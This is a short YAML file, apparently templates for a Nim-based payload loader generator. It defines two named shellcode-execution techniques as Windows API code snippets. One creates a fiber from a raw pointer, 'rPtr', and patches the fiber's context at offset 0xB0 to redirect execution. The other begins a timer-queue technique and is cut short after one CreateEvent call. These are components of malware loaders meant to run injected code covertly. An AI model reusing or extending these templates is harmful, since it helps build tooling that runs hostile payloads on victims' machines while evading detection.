- name: create_timer_queue_timer
  calls:
  - api_call: CreateEvent
    fn_template: "let event = CreateEvent(NULL, TRUE, FALSE, NULL)\n"
- name: fiber_context_edit
  calls:
  - api_call: CreateFiber
    fn_template: "let fiber = CreateFiber(0x100, cast[LPFIBER_START_ROUTINE](rPtr), NULL)\n"
  - api_call: RtlMoveMemory
    fn_template: "let target = cast[pointer](cast[int64](fiber) + 0xB0)\nlet source = cast[pointer](rPtr)\nRtlMoveMemory(target, unsafeAddr source, cast[SIZE_T](8))\n"
